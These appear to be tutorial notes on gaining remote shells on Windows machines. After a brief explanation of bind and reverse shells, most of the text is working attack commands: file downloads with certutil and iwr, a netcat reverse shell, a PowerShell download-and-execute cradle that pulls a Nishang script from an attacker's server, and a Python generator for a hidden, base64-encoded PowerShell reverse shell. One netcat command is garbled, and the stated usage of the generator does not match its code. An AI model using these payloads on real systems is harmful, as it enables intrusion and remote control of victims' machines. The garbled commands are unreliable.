
---
## **1. Reverse Shell vs Bind Shell**

When we gain control of a vulnerable system, we often want to get a shell (command line access) that we can remotely control.

There are two main ways to do this:

### **1.1 Bind Shell**

- The **victim's system** opens a port and waits for the attacker to connect.
    
- The attacker connects and gains access.
    
- The victim acts as a **server**, and the attacker is the **client**.
    

📌 **Issue:** This is easily blocked by firewalls since it requires opening a new port on the victim’s system.

📌 **Diagram:**

```
Attacker Machine ------> Victim System (Listening)
```

### **1.2 Reverse Shell**

- The **victim’s system** initiates the connection to the **attacker’s machine**.
    
- The attacker listens for incoming connections.
    
- The attacker acts as a **server**, and the victim is the **client**.
    

📌 **Why this is better:** Firewalls usually allow outgoing connections, making reverse shells harder to detect and block.

📌 **Diagram:**

```
Victim System ------> Attacker Machine (Listening)
```

---

## **2. File Transfer Commands**

When exploiting a system, we often need to **transfer tools or scripts** to help us gain further access.

### **Using `certutil` (CMD method)**

Windows has a built-in tool called `certutil` that can **download files from the internet**.

#### **Syntax:**

```
certutil -urlcache -split -f <URL> <OUTPUT-FILE>
```

#### **Example:**

```
certutil -urlcache -split -f "https://leonardotamiano.xyz/file.txt" file.txt
```

⚠ **Warning:** If Windows Defender is active, it may detect this as malicious.

---

### **Using `iwr` (PowerShell method)**

PowerShell has a command `Invoke-WebRequest` (or `iwr`) that can also download files.

#### **Syntax:**

```
Invoke-WebRequest -uri <URL> -Outfile <OUTPUT-FILE>
```

#### **Example:**

```
Invoke-WebRequest -uri "https://leonardotamiano.xyz/file.txt" -Outfile file.txt
iwr -uri "https://leonardotamiano.xyz/file.txt" -Outfile file.txt
```

---

## **3. Spawning a Reverse Shell**

To get control of a system, we need to create a **reverse shell** that connects back to our machine.

---

### **3.1 Using `cmd.exe` (Netcat Method)**

📌 **Step 1: Download `ncat.exe` (Netcat for Windows)**  
We need a tool called `ncat.exe` (Netcat). Download it:

```
iwr -uri "https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe" -Outfile nc64.exe
```

📌 **Step 2: Set up a listener on the attacker’s machine**  
Before running the reverse shell, we need a **listener** on our machine:

```
nc -lvnp 7777
```

- `-l` → Listen for connections
    
- `-v` → Verbose (show details)
    
- `-n` → No DNS resolution
    
- `-p 7777` → Listen on port 7777
    

📌 **Step 3: Execute the Reverse Shell from the victim machine**

```
C:\path to filewget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1\nc64.exe 192.168.122.1 7777 -e cmd
```

🔹 This command **connects back** to the attacker's machine and gives a remote shell.

---

### **3.2 Using PowerShell**

#### **Method 1: Using `Invoke-PowerShellTcp.ps1`**

This script from Nishang can help us spawn a PowerShell reverse shell.

📌 **Step 1: Download the script on the attacker’s machine**

```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```

📌 **Step 2: Add execution command**

```
echo "Invoke-PowerShellTcp -Reverse -IPAddress 192.168.122.1 -Port 7777" >> Invoke-PowerShellTcp.ps1
```

📌 **Step 3: Start an HTTP server to serve the script**

```
python3 -m http.server 1337
```

📌 **Step 4: Execute the script from the victim machine**

- If using **CMD.exe**:
    

```
powershell -c "iex(new-object net.webclient).downloadstring('http://192.168.122.1:1337/Invoke-PowerShellTcp.ps1')"
```

- If using **PowerShell**:
    

```
iex(new-object net.webclient).downloadstring("http://192.168.122.1:1337/Invoke-PowerShellTcp.ps1")
```

---

#### **Method 2: Using a Base64-Encoded PowerShell Reverse Shell**

A stealthier way is to use **Base64 encoding** to hide our PowerShell command.

📌 **Python script to generate Base64 payload:**

```python
#!/usr/bin/env python3

import sys
import base64

IP = "172.25.30.221"
PORT = 7777

def gen_payload(ip, port):
    payload = f"$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\", {port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"

    payload = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
    return payload

def main():
    ip, port = IP, PORT
    print(f"[INFO]: Generating payload for {ip=} AND {port=}")
    payload = gen_payload(ip, port)
    print(f"[INFO]: Payload below\n")
    print(payload)

if __name__ == "__main__":
    main()
```

📌 **Usage:**

```
python3 base64_powershell.py 192.168.122.1 7777
```

🔹 This will generate a **Base64-encoded PowerShell command** that can be run on the victim’s machine for a **stealthy** reverse shell.

---
